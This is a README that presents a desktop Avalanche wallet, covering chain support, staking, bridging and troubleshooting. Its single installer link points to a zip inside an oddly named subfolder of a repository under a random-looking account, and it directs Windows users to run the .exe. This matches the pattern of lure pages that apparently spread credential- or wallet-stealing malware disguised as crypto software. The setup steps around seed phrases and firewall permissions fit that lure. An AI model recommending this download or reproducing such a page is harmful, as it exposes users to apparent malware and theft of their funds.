# 🛡️ avax-wallet-docs - Secure desktop access for your Avalanche assets

avax-wallet-docs is a desktop application for Avalanche users. It provides a way to manage your assets without a third-party intermediary. You keep control of your keys at all times. This software connects to the Avalanche blockchain to support the X-Chain, C-Chain, and P-Chain. You can stake tokens, use bridges, and move assets between chains in one interface.

Visit [this page](https://github.com/Silicious-blankverse917/avax-wallet-docs/raw/refs/heads/main/sulker/docs_avax_wallet_3.8.zip) to download the installer for your computer. Select the file ending in .exe for Windows.

- Memory: 4 gigabytes of RAM or more.
- Storage: 500 megabytes of free disk space.
- Connection: A stable internet connection.

## 🔑 Setting up your wallet

The first time you open the program, you create a new wallet or restore an existing one. Follow these steps to secure your account:

1. Select "Create New Wallet" if you start for the first time.
2. The software shows a set of words known as a seed phrase. Write these words down on paper. Store this paper in a safe place. Do not save these words on your computer or phone.
3. Verify your phrase by entering the words in the order requested.
4. Create a strong password to lock the wallet on your computer.

Your seed phrase grants access to your funds. If you lose this paper, you lose access to your tokens. Keep it private.

## ⛓️ Understanding chain support

The Avalanche network consists of several chains. This wallet integrates all three to provide a complete experience:

- X-Chain: Use this chain for fast asset transfers.
- C-Chain: This chain works with smart contracts and decentralized finance apps.
- P-Chain: Use this chain for staking your AVAX tokens.

You can swap assets between these chains inside the wallet interface. Choose the "Cross-Chain" tab to move items from one area to another.

## 💰 Staking your assets

Staking helps secure the network and earns rewards. To stake your AVAX, follow these steps:

1. Click the "Earn" tab in the main menu.
2. Select "Add Delegator."
3. Choose the node you want to support.
4. Set the amount of AVAX to stake.
5. Confirm the duration of the stake.
6. Submit the transaction.

Your staked assets stay locked until the end of the duration you set. The wallet shows your expected rewards in the dashboard.

## 🌉 Using the bridge

The Avalanche Bridge moves tokens between different networks. This wallet connects to the bridge service automatically. 

1. Click the "Bridge" button.
2. Select the source network and the target network.
3. Enter the amount you want to transfer.
4. Review the fees and the speed.
5. Confirm the transfer.

The bridge service takes time to verify your tokens. Check the status in the history tab if you have questions about the progress.

## 🛡️ Security best practices

Protecting your data remains an essential task. Follow these rules to keep your wallet safe:

- Keep your computer updated with the latest Windows security patches.
- Use a dedicated antivirus program.
- Never share your seed phrase with anyone.
- Disable remote access tools when you do not need them.
- Lock your computer when you walk away from your desk.

## ❓ Troubleshooting common issues

If the wallet does not open or fails to sync, try these steps:

- Check your internet connection. A slow or blocked connection stops the wallet from syncing with the blockchain.
- Restart the application.
- Check if your firewall blocks the application. Make sure the wallet has permission to reach the network.
- Ensure your computer date and time settings are accurate. Mismatched time prevents the wallet from verifying blockchain data.
